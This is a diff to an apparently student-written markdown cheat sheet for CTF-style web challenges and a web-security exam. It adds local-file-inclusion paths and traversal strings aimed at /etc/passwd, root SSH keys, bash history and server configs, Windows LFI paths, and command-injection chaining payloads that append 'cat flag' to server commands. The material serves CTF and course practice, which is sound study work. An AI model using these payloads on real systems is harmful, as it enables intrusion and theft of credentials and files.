@@ -3,6 +3,9 @@ Copy pasta some commands + payloads for CTF-style challenges + COMP6843 final ex
 
 Automate your shit as much as possible because time is important + you dont have time to analyse every single request/response or do repetitive tasks.
 
+Good cheat-sheets (if shit here doesn't work):
+* https://github.com/w181496/Web-CTF-Cheatsheet
+
 # Index
 
 - [Security Setup](#security-setup) 
@@ -157,6 +160,29 @@ OR
 $ <?php passthru(['w']); ?>
 ```
 
+Other things to try:
+```
+php://filter | php://input | php://expect
+./index.php | ././index.php | .//index.php
+../../../../../../etc/passwd | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/nginx/conf.d/default.conf
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default.conf
+.htaccess
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+```
+
+Windows LFI:
+```
+C:/Windows/win.ini
+C:/boot.ini
+C:/apache/logs/access.log
+../../../../../../../../../boot.ini/....................... and so on
+C:/windows/system32/drivers/etc/hosts
+```
+
 Another LFI / LFI->RCE Cheatsheet:  
 * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
 
@@ -220,12 +246,18 @@ Examples:
 http://shitesite/lol.php?path=cat%20/etc/passwd
 http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
 ```  
+
 Injection via. chaining:  
 ```
-original_cmd_by_server; ls
-original_cmd_by_server && ls
-original_cmd_by_server | ls
-original_cmd_by_server || ls    // Only if the first cmd fail
+{original_cmd_by_server}; cat flag
+{original_cmd_by_server} && cat flag
+{original_cmd_by_server} | cat flag
+{original_cmd_by_server} || cat flag    // Only if the first cmd fail
+{original_cmd_by_server} %0a cat flag
+{original_cmd_by_server} "; cat flag
+{original_cmd_by_server} `cat flag`
+{original_cmd_by_server} cat $(ls)
+{original_cmd_by_server} "; cat $(ls)
 ```  
 Execution inside another command:  
 ```
